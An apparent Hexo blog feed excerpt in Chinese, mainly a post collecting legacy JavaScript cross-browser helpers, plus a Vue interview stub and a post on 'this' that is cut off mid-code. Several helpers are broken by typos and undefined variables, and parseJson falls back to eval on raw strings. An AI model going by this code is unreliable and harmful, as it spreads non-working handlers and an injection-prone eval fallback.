      &lt;p&gt;好久没有写博客了，今天让我们来总结一下在移动端开发网页需要注意的一些常见的兼容性问题，本人能力有限，仅仅收集了一些自己用到过的，及网上收集到的资料，如你有更多的知识点补充，欢迎联系，本文仅供参考，请以实际开发为准。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>js常用兼容性收集</title>
    <link href="https://jiuylq.github.io/2019/07/02/js-hack/"/>
    <id>https://jiuylq.github.io/2019/07/02/js-hack/</id>
    <published>2019-07-01T17:32:48.000Z</published>
    <updated>2019-07-01T17:44:19.290Z</updated>
    
    <content type="html"><![CDATA[<p>日常工作中，我们常常要和各种各样的浏览器打交道，但各个浏览器中的js的功能实现有参差不齐，本文主要是收集了一些工作中用到的js兼容性的方法，仅供参考，如有错误欢迎提出。</p><a id="more"></a><h2 id="js常用兼容性收集"><a href="#js常用兼容性收集" class="headerlink" title="js常用兼容性收集"></a>js常用兼容性收集</h2><ol><li>事件监听和移除</li></ol><p>DOM事件流:  </p><ul><li>捕获阶段(<code>capture phase</code>): 从window对象传导到目标对象。（window–document–….–目标对象）  </li><li>目标阶段(<code>target phase</code>): 目标对象本身的事件处理程序调用。  </li><li>冒泡阶段(<code>bubble phase</code>): 从目标对象传导回window对象。（目标对象–父元素–….–document–window）  </li></ul><p>这3个流程由<code>W3C</code>规定，但是在<code>IE</code>的低版本里并没有第一个捕获的过程；<br>并不是所有事件都有这3个过程，有些事件是没有冒泡的过程，例如页面<code>load</code>事件没有冒泡过程。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 事件监听</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEvent</span>(<span class="params">el, type, handler, useCapture</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(el.addEventListener) &#123; <span class="comment">// 检测是否为DOM2级方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">el, type, handler, useCapture</span>) </span>&#123;</span><br><span class="line">      el.addEventListener(type, handler, useCapture ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(el.attachEvent) &#123; <span class="comment">// 检测是否为IE级方法</span></span><br><span class="line">    <span class="comment">// IE中没有事件捕获的过程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">el, type, handler</span>) </span>&#123;</span><br><span class="line">      el.attachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// DOM0级的方法</span></span><br><span class="line">    el[<span class="string">"on"</span> + type] = handler;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeEvent</span>(<span class="params">el, type, handler, useCapture</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(el.removeEventListener) &#123; <span class="comment">// 检测是否为DOM2级方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">el, type, handler, useCapture</span>) </span>&#123;</span><br><span class="line">      el.removeEventListener(type, handler, useCapture ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(el.detachEvent) &#123; <span class="comment">// 检测是否为IE级方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">el, type, handler</span>) </span>&#123;</span><br><span class="line">      el.detachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// DOM0级的方法</span></span><br><span class="line">    el[<span class="string">"on"</span> + type] = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>获取事件及事件对象目标</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取事件对象的兼容性写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getEvent</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> event ? event : <span class="built_in">window</span>.event;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取事件对象目标的兼容性写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTarget</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> event.target || event.srcElemtnt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>手动触发事件</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tigger</span>(<span class="params">el, type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(el.dispatchEvent) &#123; <span class="comment">// 非IE</span></span><br><span class="line">    <span class="keyword">var</span> ev = <span class="built_in">document</span>.createEvent(<span class="string">'Event'</span>)</span><br><span class="line">    ev.initEvent(type, <span class="literal">true</span>, <span class="literal">true</span>)</span><br><span class="line">    e.target.dispatchEvent(ev)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// IE</span></span><br><span class="line">    el.fireEvent(<span class="string">'on'</span>+type);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>阻止默认事件</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">preventDefault</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.preventDefault) &#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  <span class="comment">// IE9-</span></span><br><span class="line">    event.returnValue = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function cancelHandler(event)&#123;</span></span><br><span class="line"><span class="comment">  if(event.preventDefault) &#123;event.preventDefault();&#125;  //标准</span></span><br><span class="line"><span class="comment">  if(event.returnValue) &#123; event.returnValue = false;&#125;  // IE</span></span><br><span class="line"><span class="comment">  return false; //用于处理使用对象属性注册的处理程序</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol start="5"><li>阻止事件冒泡</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stopPropagetion</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(event.stopPropagetion) &#123;</span><br><span class="line">    event.stopPropagetion();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// IE</span></span><br><span class="line">    event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>mouseover和mouseout 事件才包含的获取相关元素的方法</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mouseover和mouseout 事件才包含的获取相关元素的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelatedTarget</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.relatedTarget)&#123;</span><br><span class="line">        <span class="keyword">return</span> event.relatedTarget;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.toElement)&#123;</span><br><span class="line">        <span class="keyword">return</span> event.toElement;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.fromElement)&#123;</span><br><span class="line">        <span class="keyword">return</span> event.fromElement;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">document.onmouseover=function(e)&#123;</span></span><br><span class="line"><span class="comment">  var e=e||window.event;</span></span><br><span class="line"><span class="comment">  var Target=e.target||e.srcElement;//获取target的兼容写法，后面的为IE</span></span><br><span class="line"><span class="comment">  var from=e.relatedTarget||e.formElement;//鼠标来的地方，同样后面的为IE...</span></span><br><span class="line"><span class="comment">  var to=e.relatedTarget||e.toElement;//鼠标去的地方</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol start="7"><li>鼠标滚轮判断</li></ol><p>对于<code>mousedown</code> 和<code>mouseup</code> 事件来说，则在其<code>event</code> 对象存在一个<code>button</code> 属性，表示按下或释放的按钮。<br><code>DOM</code>的<code>button</code> 属性可能有如下3 个值：<br>　<code>0</code> 表示主鼠标按钮，<br>　<code>1</code> 表示中间的鼠标按钮（鼠标滚轮按钮），<br>　<code>2</code> 表示次鼠标按钮。  </p><p>在常规的设置中，主鼠标按钮就是鼠标左键，而次鼠标按钮就是鼠标右键。<br><code>IE8</code> 及之前版本也提供了<code>button</code>属性，但这个属性的值与<code>DOM</code> 的<code>button</code> 属性有很大差异。<br>　<code>0</code>：表示没有按下按钮。<br>　<code>1</code>：表示按下了主鼠标按钮。<br>　<code>2</code>：表示按下了次鼠标按钮。<br>　<code>3</code>：表示同时按下了主、次鼠标按钮。<br>　<code>4</code>：表示按下了中间的鼠标按钮。<br>　<code>5</code>：表示同时按下了主鼠标按钮和中间的鼠标按钮。<br>　<code>6</code>：表示同时按下了次鼠标按钮和中间的鼠标按钮。<br>　<code>7</code>：表示同时按下了三个鼠标按钮。  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getButton</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.implementation.hasFeature(<span class="string">"MouseEvents"</span>, <span class="string">"2.0"</span>))&#123; <span class="comment">// 检测浏览器是否支持“DOM2级”鼠标事件：</span></span><br><span class="line">    <span class="keyword">return</span> event.button;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span>(event.button)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="8"><li>监听鼠标滚轮滚动事件</li></ol><blockquote><p>滚轮事件<br><code>onmousewheel</code>  非火狐, oEvent.wheelDelta, 120 向上 &gt;0,-120 向下 &lt;0<br><code>DOMMouseScroll</code> 火狐, oEvent.detail, -3 向上 &lt;0, 3 向下 &gt;0<br><code>注</code>：你就记住火狐里面向下滚是正的<br>在<code>Opera9.5</code>及之前版本中，<code>wheelDelta</code>的正负号是颠倒的；可以使用浏览器检测技术来确定实际的值，</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addWheel</span>(<span class="params">el, handler</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(navigator.userAgent.toLowerCase().indexOf(<span class="string">'firefox'</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line">      el.addEventListener(<span class="string">'DOMMouseScroll'</span>, handler, <span class="literal">false</span>);            <span class="comment">//火狐</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      el.onmousewheel=handler;                                        <span class="comment">//非火狐</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wheelHandle</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.wheelDelta)&#123;</span><br><span class="line">    <span class="keyword">var</span> client = getBrowserInfo()</span><br><span class="line">    <span class="keyword">return</span> (client.opera &amp;&amp; client.opera &lt; <span class="number">9.5</span> ? -event.wheelDelta : event.wheelDelta);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> -event.detail * <span class="number">40</span>;<span class="comment">//firefox中的值为+3表示向上滚，-3表示向下滚</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBrowserInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> Sys = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> ua = navigator.userAgent.toLowerCase();</span><br><span class="line">  <span class="keyword">var</span> re =<span class="regexp">/(msie|firefox|chrome|opera|version).*?([\d.]+)/</span>;</span><br><span class="line">  <span class="keyword">var</span> m = ua.match(re);</span><br><span class="line">  Sys.browser = m[<span class="number">1</span>].replace(<span class="regexp">/version/</span>, <span class="string">"'safari"</span>);</span><br><span class="line">  Sys.ver = m[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span>(browser == <span class="string">'opera'</span>) &#123;</span><br><span class="line">    Sys.opera = <span class="built_in">parseFloat</span>(m[<span class="number">2</span>].split(<span class="string">'.'</span>).slice(<span class="number">0</span>,<span class="number">2</span>).join(<span class="string">'.'</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Sys;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>9.dom加载事件</p><p><code>DOMContentLoaded</code>: 兼容非IE<br><code>onreadystatechange</code>: 只是用来模拟 兼容IE<br><code>document.readyState==&#39;complete&#39;</code> 当加载成功的时候, 兼容性 全兼容  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ready</span>(<span class="params">fn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">document</span>.addEventListener)&#123;</span><br><span class="line">        <span class="built_in">document</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>,fn,<span class="literal">false</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">document</span>.readyState==<span class="string">'complete'</span>)&#123;</span><br><span class="line">                fn();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="10"><li>滚动距离</li></ol><blockquote><p>距离屏幕上方的滚动距离<br><code>document.body.scrollTop</code> 兼容性：chrome<br><code>document.documentElement.scrollTop</code> 兼容 非chrome  </p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop</span><br></pre></td></tr></table></figure><ol start="11"><li>ajax</li></ol><p><code>XMLHttpRequest</code> 对象 主流浏览器<br><code>ActiveXObject</code> 对象 兼容IE(ie5,6)  </p><p>跨域携带<code>cookie</code>:<br><code>withCredentials</code> 兼容非IE<br><code>XDomainRequest</code> 兼容IE8|IE9  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr=<span class="keyword">new</span> ActiveXObject(<span class="string">'Microsoft.XMLHTTP'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跨域携带cookie</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">  xhr.withCredentials = <span class="literal">true</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr=<span class="keyword">new</span> XDomainRequest();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="12"><li>实时统计字数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">onkeydown</span><br><span class="line">    键盘按下的时候，按下的东西，还没进文本框</span><br><span class="line">onkeyup</span><br><span class="line">    如果一直按下不统计</span><br><span class="line">onkeyup=onkeydown</span><br><span class="line">    一直按下的时候有一点卡顿</span><br><span class="line">oninput</span><br><span class="line">    IE9 删除有问题</span><br><span class="line">    iE9-  没有此方法</span><br><span class="line">onpropertychange</span><br><span class="line">    IE系列</span><br><span class="line">    IE9  删除有问题</span><br><span class="line">oT1.oninput=oT1.onpropertychange</span><br><span class="line">    IE9删除有问题</span><br><span class="line">定时器</span><br><span class="line">    没问题，性能不好</span><br><span class="line"></span><br><span class="line">方案：IE9用定时器，其他用oT1.oninput=oT1.onpropertychange</span><br></pre></td></tr></table></figure><ol start="13"><li>eval和JSON.parse</li></ol><p><code>parse</code> 标准 IE8+ 安全<br><code>eval</code> 随意 ie6 不安全  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseJson</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(str);</span><br><span class="line">  &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">'('</span>+str+<span class="string">')'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="14"><li>获取非行间样式</li></ol><p><code>getComputedStyle(obj,false).width</code> chrome FF ie9+<br>注：false:没用，只是为了兼容老版本的火狐;<br><code>obj.currentStyle.width</code> ie7 8<br>兼容写法： (getComputedStyle(obj,false) || obj.currentStyle)[width]</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getStyle</span>(<span class="params">obj,sName</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(obj.currentStyle)&#123;</span><br><span class="line">      <span class="keyword">return</span> obj.currentStyle[sName];</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> getComputedStyle(obj,<span class="literal">false</span>)[sName];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="15"><li>事件的状态(事件发生时元素的坐标)</li></ol><p>ie中:<code>event.x</code> <code>webkit</code>内核也实现了<br>Firefox中:<code>event.pagex</code></p><ol start="16"><li>跨浏览器的方式取得字符编码</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCharCode</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> event.charCode == <span class="string">"number"</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> event.charCode;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> event.keyCode;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="17"><li>访问剪贴板中的数据</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClipboardText</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> clipboardData = (event.clipboardData || <span class="built_in">window</span>.clipboardData);</span><br><span class="line">  <span class="keyword">return</span> clipboardData.getData(<span class="string">"text"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="18"><li>设置剪贴板中的数据</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setClipboardText</span>(<span class="params">event, value</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.clipboardData)&#123;</span><br><span class="line">    <span class="keyword">return</span> event.clipboardData.setData(<span class="string">"text/plain"</span>, value);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.clipboardData)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>.clipboardData.setData(<span class="string">"text"</span>, value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;日常工作中，我们常常要和各种各样的浏览器打交道，但各个浏览器中的js的功能实现有参差不齐，本文主要是收集了一些工作中用到的js兼容性的方法，仅供参考，如有错误欢迎提出。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vue-interview</title>
    <link href="https://jiuylq.github.io/2019/05/17/vue-interview/"/>
    <id>https://jiuylq.github.io/2019/05/17/vue-interview/</id>
    <published>2019-05-17T12:58:19.000Z</published>
    <updated>2019-05-19T06:25:31.947Z</updated>
    
    <content type="html"><![CDATA[<p>本文收集了一些关于vue相关知识点的面试题，仅供参考</p><a id="more"></a><h2 id="vue相关面试题收集"><a href="#vue相关面试题收集" class="headerlink" title="vue相关面试题收集"></a>vue相关面试题收集</h2><p>1、vue 父子组件嵌套时，组件内部的各个生命周期钩子触发先后顺序</p><p><img src="/2019/05/17/vue-interview/./images/vue-interview-01.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文收集了一些关于vue相关知识点的面试题，仅供参考&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>你不知道的this</title>
    <link href="https://jiuylq.github.io/2019/05/17/this/"/>
    <id>https://jiuylq.github.io/2019/05/17/this/</id>
    <published>2019-05-16T17:30:03.000Z</published>
    <updated>2019-07-10T12:58:41.813Z</updated>
    
    <content type="html"><![CDATA[<p>作为一名前端工作人员，日常工作中常常需要与<code>this</code>打交道,但你真的懂<code>this</code>吗？this是什么？有什么用？this是如何工作的？下面让我们来深入了解一下JavaScript中的<code>this</code>吧！<br><a id="more"></a></p><h2 id="你不知道的this"><a href="#你不知道的this" class="headerlink" title="你不知道的this"></a>你不知道的this</h2><h3 id="你真的懂this吗？"><a href="#你真的懂this吗？" class="headerlink" title="你真的懂this吗？"></a>你真的懂this吗？</h3><p>this关键字是JavaScript中最复杂的机制之一，是一个特别的关键字，被自动定义在所有函数的作用域中，但是相信很多JavaScript开发者并不是非常清楚它究竟指向的是什么。听说你很懂this,是真的吗？</p><p>来一道测试题，控制台打印出来的值是什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    number: <span class="number">3</span>,</span><br><span class="line">    fn1: (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> 